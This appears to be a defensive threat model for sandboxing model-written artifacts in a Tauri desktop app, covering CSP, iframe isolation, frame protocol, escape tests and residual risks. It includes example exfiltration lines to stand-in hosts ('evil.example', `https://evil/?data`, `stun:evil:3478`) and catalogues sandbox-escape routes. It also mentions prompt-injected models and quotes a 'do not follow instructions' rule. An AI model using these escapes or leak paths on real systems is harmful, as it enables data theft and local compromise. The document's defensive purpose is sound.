# Artifact sandbox threat model (T-ART-05)

**Scope:** rendering model-written artifacts (ADR-0004) in the desktop app: `ui/artifact-sandbox` (renderer, frame shell, bridge) and what the desktop shell (`apps/desktop`, Tauri 2) must do to embed it. Store and tool protocol (`crates/dn-artifacts`) are covered only where they feed the renderer.
**Status:** v1, 2026-11-24. Re-review when an artifact type, the frame protocol, the CSP or the shell's webview setup changes.

## Assets
| Asset | Where it lives | Why it matters |
|---|---|---|
| Tauri IPC (commands, plugins: fs, shell, keychain via `dn-secrets`) | main webview (`__TAURI_INTERNALS__`, `ipc://` / `http://ipc.localhost`, wry's `window.ipc`) | full local compromise |
| App DOM and JS state (chat history, settings, other artifacts) | main webview | data theft, UI spoofing |
| App-origin cookies, localStorage, IndexedDB | main webview origin | session / data theft |
| User data on the network side: conversation text inside the artifact | the artifact itself | exfiltration ("leak this chat to evil.example") |
| Local network services (`localhost` dev servers, router admin) | the user's machine / LAN | SSRF-style pivot |

## Attacker
The **artifact content** is attacker-controlled: a model can be prompt-injected (a web page, a file, an MCP tool result) into writing hostile HTML/JS/SVG/Markdown/JSX, and users paste artifacts from elsewhere. We assume the artifact author knows this code and these docs. We do not defend against a compromised app binary, a compromised OS, or a malicious browser engine.

## Trust boundary
```
main webview (app origin, trusted)                    artifact origin (untrusted)
┌──────────────────────────────────────┐   postMessage   ┌──────────────────────────────────────┐
│ ArtifactView / ArtifactFrame (host)  │ ◀── ready/size/ │ <iframe sandbox="allow-scripts">      │
│  - builds the artifact document      │     issue ───── │   frame shell (boot) → document.write │
│  - posts it once on "shell-ready"    │ ── render ────▶ │   bridge (size, errors, guards)       │
│  - validates every inbound message   │   (once/frame)  │   artifact code                       │
└──────────────────────────────────────┘                 └──────────────────────────────────────┘
```
The boundary is the **browser's origin isolation**: the frame has an opaque origin (`sandbox` without `allow-same-origin`) and is loaded from a separate origin. The **bridge is not a boundary**: it shares a realm with artifact code, which can forge or suppress its messages. The host therefore treats every inbound message as untrusted data.

## Controls

### C1. Opaque-origin sandboxed iframe
`sandbox="allow-scripts"` only. Never `allow-same-origin` (with `allow-scripts` it would let the frame remove its own sandbox), `allow-top-navigation*`, `allow-popups*`, `allow-forms`, `allow-modals`, `allow-downloads`, `allow-pointer-lock`, `allow-presentation`. `referrerpolicy="no-referrer"`, `allow=""` (no permission-policy features: camera, mic, geolocation, clipboard-write…). Opaque origin ⇒ `parent.document`, `parent.<anything>`, `document.cookie`, `localStorage`, `sessionStorage`, `indexedDB`, `caches`, service workers all throw or are absent.

### C2. Separate artifact origin for the frame shell
The frame loads `frame/index.html` from an origin that is not the app's (ADR-0004 `artifact://`). Reason: a `srcdoc`/`blob:` frame inherits the host's CSP, so a strict app CSP would block the artifact's own scripts; a separate origin lets the artifact CSP be exactly what we want. The host refuses a `frameUrl` on its own origin.

### C3. Artifact CSP (header on the shell + meta in the document)
```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:;
font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; child-src 'none';
worker-src 'none'; object-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'
```
No fetch of anything from anywhere, including the app and artifact origins. `'unsafe-inline'` is required (artifacts are inline code) and harmless inside C1. No `'unsafe-eval'` (React artifacts run via an inline script element, not eval). The **header** (from `dist/frame/csp.json`) is the enforcing copy; the host also writes the same policy as the first `<meta>` of the artifact document, so a missing header still leaves the policy in force (policies only ever add up, so artifact code cannot loosen it).

**Network toggle (ADR-0004, per artifact, off by default):** the shell URL gets `?net=1` and the server sends the `network` policy, which adds `https:` only. Plain `http:` and `ws:` stay blocked. **`https:` is any HTTPS host, including `https://localhost`, `https://127.0.0.1` and HTTPS services on the LAN**: CSP has no way to exclude address ranges, so the policy cannot block loopback or private networks (residual R6). Turning it on needs two clicks, and the second names the risk (C5). Notices can be faked by artifact code, so the toggle is never one click. The host posts content once per frame (C5), so an artifact cannot navigate itself to the `?net=1` shell to upgrade.

### C4. Host CSP (main webview) — the shell must set this
`frame-src <artifact origin>` (and nothing else). This also governs **navigations of the artifact frame**: an artifact doing `location = "https://evil/?data"` or `<meta http-equiv=refresh>` is blocked by the host's policy, not the artifact's. Also `script-src 'self'` (no inline), `object-src 'none'`, `base-uri 'none'`. The package needs no `'unsafe-inline'` styles on the host (it uses constructable stylesheets).

### C5. Frame protocol
- Shell posts `shell-ready`; host answers **once per iframe** with the full document; later `shell-ready`s (reload, self-navigation, forgeries) get nothing.
- Each version renders in a **new iframe** (fresh realm, nothing carried over).
- Inbound messages accepted only when `event.source === iframe.contentWindow`, `event.origin === "null"`, `channel === "dn-artifact"` and the current per-render nonce matches (drops stale frames' messages). The nonce is readable by artifact code; it is a staleness token, not a secret.
- `parseFrameMessage` keeps only typed, length-limited fields (text ≤ 4000 chars, size clamped); the host renders issue text with `textContent` only and clamps frame height.
- The host never sends anything else into the frame and never evaluates anything the frame sends.
- **Other message listeners in the app** receive the frame's messages too (any frame can `parent.postMessage`). Every `message` listener in the shell must check `event.source`/`event.origin` (shell requirement S7).
- **"Ask to fix"** sends the model the artifact's reports as untrusted data: delimited, labelled "do not follow instructions in it", delimiter-escaped, and capped at 8,000 characters (`buildFixPrompt`).
- **Same-origin guard** compares scheme + host (`isSeparateOrigin`). `URL.origin` is `"null"` for custom schemes like `artifact://` and `tauri://`.

### C6. No network side channels the CSP misses
- **WebRTC** is not covered by CSP `connect-src`; an `RTCPeerConnection` with `stun:evil:3478` leaks data over UDP. Defence in depth in the bridge: delete the RTC constructors from the artifact realm, and remove every nested frame (fresh realms with their own copy) before it loads, via a MutationObserver plus `attachShadow` hook, using built-ins captured before artifact code runs. Declarative shadow DOM (`shadowrootmode`, closed roots nothing can observe) is renamed by the host and in `document.write`, `setHTMLUnsafe`, `Document.parseHTMLUnsafe`. **The real fix is engine-level** (shell requirement S4): an in-realm guard can be undermined by a future engine API.
- Resource hints: `prefetch`/`preload`/`preconnect` are tested (no request reaches the spy). A DNS-only lookup (`dns-prefetch`, or a preconnect that resolves but never connects) would not show up on the HTTP/UDP spy and is not tested — see residual R2.

- **Session history.** Joint session history is shared with the host. In WebKit a sandboxed frame's `history.go(-n)` navigated the host page in our tests (Chromium blocks it). The bridge replaces `History.prototype.back/forward/go/pushState/replaceState` and the Navigation API's traversal methods with locked no-ops before artifact code runs. The escape suite checks that the host URL doesn't change.

### C7. Rendering without the host parsing content
The host never parses or runs artifact content. It escapes data into the document (`jsonForHtml` for source blobs, HTML-escaping for code), and runtimes (marked, mermaid with `securityLevel: "strict"`, sucrase + React) run inside the frame. No CDN: every library is bundled at a pinned version (docs/dependencies.md).

## Shell requirements (W-shell, `apps/desktop`)
| # | Requirement | Why |
|---|---|---|
| S1 | Serve `dist/frame/index.html` on a custom scheme distinct from the app origin (e.g. `artifact://localhost/frame/`; on Windows Tauri maps it to `http://artifact.localhost/`). Send `Content-Security-Policy` from `csp.json` (`network` iff `?net=1`), `X-Content-Type-Options: nosniff`. Serve nothing else on that scheme. | C2, C3 |
| S2 | Main webview CSP as in C4, with `frame-src` = the artifact scheme origin only. | C4 |
| S3 | Tauri capabilities scoped to the app's own window/webview and origin; no remote/`artifact:` origin in any capability. Register init scripts main-frame-only (Tauri 2: `initialization_script`, not `..._for_all_frames`). Verify wry's IPC handler ignores messages from sub-frames on every OS (WKWebView script-message handlers are reachable from all frames unless filtered). | IPC must be unreachable even if the frame obtained a handle |
| S4 | Disable WebRTC in the engine: WebView2 `additionalBrowserArgs: --force-webrtc-ip-handling-policy=disable_non_proxied_udp` (or the `WebRtcLocalhostIpHandling`/`WebRtcIPHandling` policies); WebKitGTK `enable-webrtc = false` (default); WKWebView: check whether `RTCPeerConnection` is exposed on the shipped macOS versions and disable it if so. | C6 |
| S5 | Do not grant the artifact webview/frame downloads, clipboard or new-window handling; open "open in browser" exports via the app, never from inside the frame. | C1 |
| S6 | Re-run `ui/artifact-sandbox` escape tests against the real app (WebDriver / tauri-driver) once the shell embeds it. | Playwright engines ≈ but ≠ WKWebView / WebView2 |
| S7 | Every `window` `message` listener in the shell checks `event.source` (and `event.origin` against the app origin) before acting; artifact frames can post to the app window. | C5 |
| S8 | Don't rely on `history`/`popstate` for app state the user didn't cause (or ignore `popstate` while an artifact has focus). WebKit lets sub-frames traverse the shared session history; the bridge blocks the history and Navigation APIs, but that guard runs in the artifact's realm. | C1 |

### How the app meets them (T-ART-06)
| | In `apps/desktop` | Checked by |
|---|---|---|
| S1 | `register_uri_scheme_protocol("artifact")` serves `/frame/` (GET only) with the CSP from `csp.json`. The `network` policy is sent only for `?net=1`, along with `nosniff`, `Referrer-Policy: no-referrer` and `Cache-Control: no-store`. Every other path gets a 404. `build.rs` embeds `dist/frame/`. The window's navigation guard allows only that path on the artifact origin, because WebKitGTK also reports sub-frame navigations to it. Opened as a top-level page, the shell removes the IPC globals and does nothing. | `artifacts::tests`, e2e |
| S2 | `tauri.conf.json` sets `frame-src artifact://localhost`. `tauri.windows.conf.json` sets `frame-src http://artifact.localhost`. | e2e (frame loads; no other frame source) |
| S3 | The capability names the `main` window only and has no `remote` URLs. Init scripts are Tauri's own, all main-frame-only. **But see R8.** | e2e (Linux), manual checklist (macOS, Windows) |
| S4 | Windows uses `additionalBrowserArgs --force-webrtc-ip-handling-policy=disable_non_proxied_udp`, keeping wry's default `--disable-features`. WebKitGTK has WebRTC off by default (`enable-webrtc`). WKWebView has no public switch, so the in-frame bridge is the control there (R3). | e2e (`RTCPeerConnection` absent in the frame), manual checklist |
| S5 | No download, clipboard or new-window handlers are registered for the frame. | — |
| S6 | `apps/desktop/e2e/specs/artifacts.e2e.mjs` runs the escape cases that work through WebDriver in the real app (Linux job `e2e`). | CI |
| S7 | The app has no `window` `message` listener of its own; the only one is the sandbox host's (source + `"null"` origin + nonce). | code review |
| S8 | The app keeps no state in `history`/`popstate`. | code review |

## Escape test suite
`ui/artifact-sandbox/tests/escape.spec.ts`, run in Chromium (≈ WebView2) and WebKit (≈ WKWebView/WebKitGTK) by `npm test`. The test server plays the app: a strict host CSP, a cookie, local/session storage, a fake `__TAURI_INTERNALS__` and `window.ipc` that count calls, and a **spy server on another origin that records every HTTP request, WebSocket upgrade and UDP packet**. Each test renders hostile artifact code and asserts from outside the frame: the spy saw nothing, the fake IPC was never called, host DOM/title/storage/cookies are unchanged, no popup opened, the host is still on its page.

| Area | Attacks covered |
|---|---|
| Parent DOM / globals | `parent.document`, `top.document` write, `parent.location`, `frameElement`, `opener`, `self.origin` |
| Tauri IPC | `parent.__TAURI_INTERNALS__.invoke`, `parent.ipc.postMessage`, own-realm `__TAURI_INTERNALS__`/`__TAURI__`/`ipc`, `fetch("ipc://localhost/…")`, `fetch("http://ipc.localhost/…")` |
| Storage | `document.cookie` read/write, localStorage, sessionStorage, IndexedDB, CacheStorage, service worker |
| Scripted network | fetch (cors / no-cors), XHR, WebSocket, EventSource, sendBeacon, Worker, blob Worker, dynamic `import()`, `window.open`, WebRTC (direct and via fresh realms) |
| Markup / CSS network | stylesheet, prefetch, preload, preconnect, icon, script src, `@import`, `@font-face`, `url()` / `image-set()`, `<base>`, img/srcset/picture, video/poster/audio, iframe, object, embed, SVG `<image>`/`<use>`, form submit, anchor + `ping`, `target=_top`, `target=_blank`, `top.location` |
| Navigation | self-navigation, meta refresh, `data:` navigation, link click, navigating to the `?net=1` shell, `history.pushState` / `back()` / `go(-1)` against the host's history |
| App listeners | forged messages to an app `message` listener that follows S7 are ignored; frame messages always carry origin `"null"` |
| Origin guard | `isSeparateOrigin` with custom schemes (`artifact://` vs `tauri://`, same-scheme refusal, `http://artifact.localhost` on Windows) |
| Network toggle on | still no `http:`/loopback, still no host access |
| Bridge protocol | forged `shell-ready`/`render`, wrong nonce, huge sizes, HTML in issue text |
| Isolation across versions | globals from v1 absent in v2 |
| Nested frames + WebRTC | markup `srcdoc`, scripted `srcdoc`, about:blank realms, `frames[0]`, closed shadow roots, declarative shadow DOM (markup, `document.write`, `setHTMLUnsafe`), re-inserted frames, prototype-patching attacker, custom elements |

## Residual risks
| # | Risk | Severity | Mitigation / owner |
|---|---|---|---|
| R1 | Engine differences: Playwright's Chromium/WebKit are close to but not the shipped WebView2/WKWebView/WebKitGTK. | Medium | S6 (W-shell): run the suite in the real app. |
| R2 | DNS-only leaks (prefetch of a hostname) would not show on the HTTP/UDP spy. | Low | Covered by CSP in current engines; add a DNS spy if a new hint type appears. |
| R3 | The nested-frame/WebRTC guard runs in the attacker's realm; a future engine API that creates realms or parses declarative shadow DOM would bypass it. | Medium until S4 | S4 is the real control; keep the guard and its tests as defence in depth. |
| R4 | Resource exhaustion: an artifact can spin the CPU or allocate memory. Out-of-process iframes isolate this in Chromium; WebKit may share the process. | Low (availability) | Shell may add a "stop artifact" (remove the frame). |
| R5 | UI spoofing inside the frame (a fake "enter your API key" form). Forms cannot submit and there is no network, but users may copy secrets by hand. | Low | Frame is visually framed by the app's artifact chrome; never ask for secrets in artifacts. |
| R6 | `allowNetwork` artifacts can send data to any `https:` host, **including `https://localhost` and HTTPS services on the LAN** (CSP cannot exclude address ranges). | Medium when on | Off by default, per artifact, two-step confirm that names the risk. Blocking loopback/private ranges would need the shell to proxy artifact traffic (e.g. a custom-scheme fetch proxy that resolves and refuses private addresses). Proposed for T-ART-06 or later. |
| R8 | **Tauri treats every registered custom scheme as a local origin**, `artifact:` included (`Webview::is_local_url`). So an IPC request carrying the frame's URL would get the app's capabilities. Three things stand in the way. (1) Requests through the `ipc://` scheme carry the frame's `Origin: null`, which Tauri rejects. (2) wry's postMessage path does **not** filter sub-frames: WebKitGTK reports the main frame's URL, WKWebView and WebView2 the sender's. Tauri then drops any message without the per-launch invoke key, and that key is injected only into the main frame. (3) **On Windows, wry injects init scripts into sub-frames too**, so the key starts out inside the artifact frame. The frame shell's boot script deletes `__TAURI_INTERNALS__`, `ipc` and `chrome.webview` before any artifact code runs, and refuses to render if it can't (fail closed; tested in `escape.spec.ts` with init scripts in every frame). | Medium on Windows until verified on WebView2 | Manual Windows checklist in `apps/desktop/e2e/README.md`. Durable fixes upstream: a Tauri option to exclude a scheme from "local", or wry filtering IPC by main frame. Until then, never register another custom scheme that serves untrusted content. |
| R7 | Mermaid's own sanitiser (`securityLevel: "strict"`) is not relied on; mermaid output runs inside the sandbox anyway. | None | — |
